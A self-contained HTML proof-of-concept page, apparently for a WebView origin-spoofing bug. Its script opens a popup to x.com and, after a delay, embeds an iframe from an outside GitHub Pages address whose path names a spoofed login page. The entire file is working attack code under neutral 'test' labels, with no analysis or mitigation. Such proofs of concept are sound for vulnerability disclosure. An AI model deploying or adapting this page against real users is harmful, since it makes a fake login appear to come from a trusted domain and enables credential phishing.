<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WebView Origin Test PoC</title>

<style>
body {
  font-family: Arial;
  text-align: center;
  margin-top: 80px;
}

button {
  padding: 12px 20px;
  font-size: 16px;
}

iframe {
  margin-top: 20px;
  width: 90%;
  height: 400px;
  border: 1px solid #ccc;
}
</style>

</head>

<body>

<h2>WebView Origin Test</h2>
<p>Test window navigation behavior</p>

<button onclick="test()">Start Test</button>

<div id="frameContainer"></div>

<script>
function test() {

  const win = window.open("https://x.com:9090");

  if (!win) {
    alert("Popup blocked");
    return;
  }

  setTimeout(() => {

    try {

      const iframe = document.createElement("iframe");

      iframe.src = "https://cnfdnfial-ops.github.io/spoof/login";
      iframe.title = "WebView iframe test";

      document
        .getElementById("frameContainer")
        .appendChild(iframe);

    } catch (e) {
      console.log("Error:", e);
    }

  }, 3000);

}
</script>

</body>
</html>
